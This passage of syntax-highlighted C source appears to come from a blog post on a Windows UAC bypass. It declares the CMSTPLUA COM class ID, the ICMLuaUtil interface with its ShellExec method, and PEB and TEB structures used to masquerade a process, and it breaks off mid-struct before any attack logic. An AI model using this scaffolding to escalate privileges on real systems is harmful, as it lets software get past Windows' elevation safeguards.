class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;objbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strsafe.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Shobjidl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ole32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;oleaut32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;user32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLSID_CMSTPLUA <span class="string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IID_ICMLuaUtil <span class="string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTL_MAX_DRIVE_LETTERS 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE32 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE64 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_BATCH_BUFFER_SIZE 310</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NT_SUCCESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(_M_X64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE GDI_HANDLE_BUFFER_SIZE32</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE GDI_HANDLE_BUFFER_SIZE64</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> interface ICMLuaUtil ICMLuaUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ICMLuaUtilVtbl</span> &#123;</span><br><span class="line">    <span class="function">BEGIN_INTERFACE</span></span><br><span class="line"><span class="function">    <span class="title">HRESULT</span><span class="params">(STDMETHODCALLTYPE* QueryInterface)</span><span class="params">(__RPC__in ICMLuaUtil* This, __RPC__in REFIID riid, _COM_Outptr_ <span class="type">void</span>** ppvObject)</span></span>;</span><br><span class="line">    <span class="built_in">ULONG</span>(STDMETHODCALLTYPE* AddRef)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">ULONG</span>(STDMETHODCALLTYPE* Release)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method1)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method2)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method3)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method4)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method5)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method6)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* ShellExec)(__RPC__in ICMLuaUtil* This, _In_ LPCWSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* SetRegistryStringValue)(__RPC__in ICMLuaUtil* This, _In_ HKEY hKey, _In_opt_ LPCTSTR lpSubKey, _In_opt_ LPCTSTR lpValueName, _In_ LPCTSTR lpValueString);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method9)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method10)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method11)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method12)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method13)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method14)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method15)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method16)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method17)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method18)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method19)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    <span class="built_in">HRESULT</span>(STDMETHODCALLTYPE* Method20)(__RPC__in ICMLuaUtil* This);</span><br><span class="line">    END_INTERFACE</span><br><span class="line">&#125; *PICMLuaUtilVtbl;</span><br><span class="line"></span><br><span class="line">interface ICMLuaUtil &#123;</span><br><span class="line">    CONST_VTBL <span class="keyword">struct</span> <span class="title class_">ICMLuaUtilVtbl</span>* lpVtbl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING</span> &#123;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PCHAR Buffer;</span><br><span class="line">&#125; STRING, *PSTRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CLIENT_ID</span> &#123;</span><br><span class="line">    HANDLE UniqueProcess;</span><br><span class="line">    HANDLE UniqueThread;</span><br><span class="line">&#125; CLIENT_ID, *PCLIENT_ID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY_COMPATIBLE</span> &#123;</span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">        LIST_ENTRY InProgressLinks;</span><br><span class="line">    &#125; DUMMYUNION0;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG Flags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            ULONG PackagedBinary : <span class="number">1</span>;</span><br><span class="line">            ULONG MarkedForRemoval : <span class="number">1</span>;</span><br><span class="line">            ULONG ImageDll : <span class="number">1</span>;</span><br><span class="line">            ULONG LoadNotificationsSent : <span class="number">1</span>;</span><br><span class="line">            ULONG TelemetryEntryProcessed : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessStaticImport : <span class="number">1</span>;</span><br><span class="line">            ULONG InLegacyLists : <span class="number">1</span>;</span><br><span class="line">            ULONG InIndexes : <span class="number">1</span>;</span><br><span class="line">            ULONG ShimDll : <span class="number">1</span>;</span><br><span class="line">            ULONG InExceptionTable : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags1 : <span class="number">2</span>;</span><br><span class="line">            ULONG LoadInProgress : <span class="number">1</span>;</span><br><span class="line">            ULONG LoadConfigProcessed : <span class="number">1</span>;</span><br><span class="line">            ULONG EntryProcessed : <span class="number">1</span>;</span><br><span class="line">            ULONG ProtectDelayLoad : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags3 : <span class="number">2</span>;</span><br><span class="line">            ULONG DontCallForThreads : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessAttachCalled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessAttachFailed : <span class="number">1</span>;</span><br><span class="line">            ULONG CorDeferredValidate : <span class="number">1</span>;</span><br><span class="line">            ULONG CorImage : <span class="number">1</span>;</span><br><span class="line">            ULONG DontRelocate : <span class="number">1</span>;</span><br><span class="line">            ULONG CorILOnly : <span class="number">1</span>;</span><br><span class="line">            ULONG ChpeImage : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags5 : <span class="number">2</span>;</span><br><span class="line">            ULONG Redirected : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedFlags6 : <span class="number">2</span>;</span><br><span class="line">            ULONG CompatDatabaseProcessed : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; ENTRYFLAGSUNION;</span><br><span class="line">    WORD ObsoleteLoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; DUMMYUNION1;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        PVOID LoadedImports;</span><br><span class="line">    &#125; DUMMYUNION2;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY_COMPATIBLE, *PLDR_DATA_TABLE_ENTRY_COMPATIBLE, LDR_DATA_TABLE_ENTRY, *PCLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span> &#123;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    BOOLEAN Initialized;</span><br><span class="line">    HANDLE SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress;</span><br><span class="line">    BOOLEAN ShutdownInProgress;</span><br><span class="line">    HANDLE ShutdownThreadId;</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR</span> &#123;</span><br><span class="line">    UNICODE_STRING DosPath;</span><br><span class="line">    HANDLE Handle;</span><br><span class="line">&#125; CURDIR, *PCURDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR</span> &#123;</span><br><span class="line">    USHORT Flags;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS</span> &#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    HANDLE ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    HANDLE StandardInput;</span><br><span class="line">    HANDLE StandardOutput;</span><br><span class="line">    HANDLE StandardError;</span><br><span class="line">    CURDIR CurrentDirectory;</span><br><span class="line">    UNICODE_STRING DllPath;</span><br><span class="line">    UNICODE_STRING ImagePathName;</span><br><span class="line">    UNICODE_STRING CommandLine;</span><br><span class="line">    PVOID Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING WindowTitle;</span><br><span class="line">    UNICODE_STRING DesktopInfo;</span><br><span class="line">    UNICODE_STRING ShellInfo;</span><br><span class="line">    UNICODE_STRING RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">    ULONG EnvironmentVersion;</span><br><span class="line">    PVOID PackageDependencyData;</span><br><span class="line">    ULONG ProcessGroupId;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line">    BOOLEAN InheritedAddressSpace;</span><br><span class="line">    BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">    BOOLEAN BeingDebugged;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        BOOLEAN BitField;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            BOOLEAN ImageUsesLargePages : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsImageDynamicallyRelocated : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN SkipPatchingUser32Forwarders : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsPackagedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsAppContainer : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcessLight : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsLongPathAwareProcess : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    HANDLE Mutant;</span><br><span class="line">    PVOID ImageBaseAddress;</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    PVOID SubSystemData;</span><br><span class="line">    PVOID ProcessHeap;</span><br><span class="line">    PRTL_CRITICAL_SECTION FastPebLock;</span><br><span class="line">    PVOID AtlThunkSListPtr;</span><br><span class="line">    PVOID IFEOKey;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG CrossProcessFlags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            ULONG ProcessInJob : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessInitializing : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVEH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVCH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingFTH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessPreviouslyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessCurrentlyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedBits0 : <span class="number">25</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        ULONG EnvironmentUpdateCount;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PVOID KernelCallbackTable;</span><br><span class="line">        PVOID UserSharedInfoPtr;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG SystemReserved[<span class="number">1</span>];</span><br><span class="line">    ULONG AtlThunkSListPtr32;</span><br><span class="line">    PVOID ApiSetMap;</span><br><span class="line">    ULONG TlsExpansionCounter;</span><br><span class="line">    PVOID TlsBitmap;</span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">    PVOID HotpatchInformation;</span><br><span class="line">    PVOID* ReadOnlyStaticServerData;</span><br><span class="line">    PVOID AnsiCodePageData;</span><br><span class="line">    PVOID OemCodePageData;</span><br><span class="line">    PVOID UnicodeCaseTableData;</span><br><span class="line">    ULONG NumberOfProcessors;</span><br><span class="line">    ULONG NtGlobalFlag;</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    SIZE_T HeapSegmentReserve;</span><br><span class="line">    SIZE_T HeapSegmentCommit;</span><br><span class="line">    SIZE_T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    SIZE_T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    ULONG NumberOfHeaps;</span><br><span class="line">    ULONG MaximumNumberOfHeaps;</span><br><span class="line">    PVOID* ProcessHeaps;</span><br><span class="line">    PVOID GdiSharedHandleTable;</span><br><span class="line">    PVOID ProcessStarterHelper;</span><br><span class="line">    ULONG GdiDCAttributeList;</span><br><span class="line">    PRTL_CRITICAL_SECTION LoaderLock;</span><br><span class="line">    ULONG OSMajorVersion;</span><br><span class="line">    ULONG OSMinorVersion;</span><br><span class="line">    USHORT OSBuildNumber;</span><br><span class="line">    USHORT OSCSDVersion;</span><br><span class="line">    ULONG OSPlatformId;</span><br><span class="line">    ULONG ImageSubsystem;</span><br><span class="line">    ULONG ImageSubsystemMajorVersion;</span><br><span class="line">    ULONG ImageSubsystemMinorVersion;</span><br><span class="line">    ULONG_PTR ImageProcessAffinityMask;</span><br><span class="line">    GDI_HANDLE_BUFFER GdiHandleBuffer;</span><br><span class="line">    PVOID PostProcessInitRoutine;</span><br><span class="line">    PVOID TlsExpansionBitmap;</span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    PVOID AppCompatInfo;</span><br><span class="line">    UNICODE_STRING CSDVersion;</span><br><span class="line">    PVOID ActivationContextData;</span><br><span class="line">    PVOID ProcessAssemblyStorageMap;</span><br><span class="line">    PVOID SystemDefaultActivationContextData;</span><br><span class="line">    PVOID SystemAssemblyStorageMap;</span><br><span class="line">    SIZE_T MinimumStackCommit;</span><br><span class="line">    PVOID* FlsCallback;</span><br><span class="line">    LIST_ENTRY FlsListHead;</span><br><span class="line">    PVOID FlsBitmap;</span><br><span class="line">    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (<span class="built_in">sizeof</span>(ULONG) * <span class="number">8</span>)];</span><br><span class="line">    ULONG FlsHighIndex;</span><br><span class="line">    PVOID WerRegistrationData;</span><br><span class="line">    PVOID WerShipAssertPtr;</span><br><span class="line">    PVOID pContextData;</span><br><span class="line">    PVOID pImageHeaderHash;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG TracingFlags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            ULONG HeapTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG CritSecTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG LibLoaderTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG SpareTracingBits : <span class="number">29</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONGLONG CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125; PEB, *PPEB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_GDI_TEB_BATCH</span> &#123;</span><br><span class="line">    ULONG Offset;</span><br><span class="line">    UCHAR Alignment[<span class="number">4</span>];</span><br><span class="line">    ULONG_PTR HDC;</span><br><span class="line">    ULONG Buffer[GDI_BATCH_BUFFER_SIZE];</span><br><span class="line">&#125; GDI_TEB_BATCH, *PGDI_TEB_BATCH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TEB_ACTIVE_FRAME_CONTEXT</span> &#123;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PSTR FrameName;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TEB_ACTIVE_FRAME</span> &#123;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_TEB_ACTIVE_FRAME</span>* Previous;</span><br><span class="line">    PTEB_ACTIVE_FRAME_CONTEXT Context;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TEB</span> &#123;</span><br><span class="line">    NT_TIB NtTib;</span><br><span class="line">    PVOID EnvironmentPointer;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    PVOID ActiveRpcHandle;</span><br><span class="line">    PVOID ThreadLocalStoragePointer;</span><br><span class="line">    PPEB ProcessEnvironmentBlock;</span><br><span class="line">    ULONG LastErrorValue;</span><br><span class="line">    ULONG CountOfOwnedCriticalSections;</span><br><span class="line">    PVOID CsrClientThread;</span><br><span class="line">    PVOID Win32ThreadInfo;</span><br><span class="line">    ULONG User32Reserved[<span class="number">26</span>];</span><br><span class="line">    ULONG UserReserved[<span class="number">5</span>];</span><br><span class="line">    PVOID WOW32Reserved;</span><br><span class="line">    LCID CurrentLocale;</span><br><span class="line">    ULONG FpSoftwareStatusRegister;</span><br><span class="line">    PVOID SystemReserved1[<span class="number">54</span>];</span><br><span class="line">    NTSTATUS ExceptionCode;</span><br><span class="line">    PVOID ActivationContextStackPointer;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">24</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">36</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG TxFsContext;</span><br><span class="line">    GDI_TEB_BATCH GdiTebBatch;</span><br><span class="line">    CLIENT_ID RealClientId;</span><br><span class="line">    HANDLE GdiCachedProcessHandle;</span><br><span class="line">    ULONG GdiClientPID;</span><br><span class="line">    ULONG GdiClientTID;</span><br><span class="line">    PVOID GdiThreadLocalInfo;</span><br><span class="line">    ULONG_PTR Win32ClientInfo[<span class="number">62</span>];</span><br><span class="line">    PVOID glDispatchTable[<span class="number">233</span>];</span><br><span class="line">    ULONG_PTR glReserved1[<span class="number">29</span>];</span><br><span class="line">    PVOID glReserved2;</span><br><span class="line">    PVOID glSectionInfo;</span><br><span class="line">    PVOID glSection;</span><br><span class="line">    PVOID glTable;</span><br><span class="line">    PVOID glCurrentRC;</span><br><span class="line">    PVOID glContext;</span><br><span class="line">    NTSTATUS LastStatusValue;</span><br><span class="line">    UNICODE_STRING StaticUnicodeString;</span><br><span class="line">    WCHAR StaticUnicodeBuffer[<span class="number">261</span>];</span><br><span class="line">    PVOID DeallocationStack;</span><br><span class="line">    PVOID TlsSlots[<span class="number">64</span>];</span><br><span class="line">    LIST_ENTRY TlsLinks;</span><br><span class="line">    PVOID Vdm;</span><br><span class="line">    PVOID ReservedForNtRpc;</span><br><span class="line">    PVOID DbgSsReserved[<span class="number">2</span>];</span><br><span class="line">    ULONG HardErrorMode;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID Instrumentation[<span class="number">11</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID Instrumentation[<span class="number">9</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    GUID ActivityId;</span><br><span class="line">    PVOID SubProcessTag;</span><br><span class="line">    PVOID EtwLocalData;</span><br><span class="line">    PVOID EtwTraceData;</span><br><span class="line">    PVOID WinSockData;</span><br><span class="line">    ULONG GdiBatchCount;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PROCESSOR_NUMBER CurrentIdealProcessor;</span><br><span class="line">        ULONG IdealProcessorValue;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            UCHAR ReservedPad0;</span><br><span class="line">            UCHAR ReservedPad1;</span><br><span class="line">            UCHAR ReservedPad2;</span><br><span class="line">            UCHAR IdealProcessor;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG GuaranteedStackBytes;</span><br><span class="line">    PVOID ReservedForPerf;</span><br><span class="line">    PVOID ReservedForOle;</span><br><span class="line">    ULONG WaitingOnLoaderLock;</span><br><span class="line">    PVOID 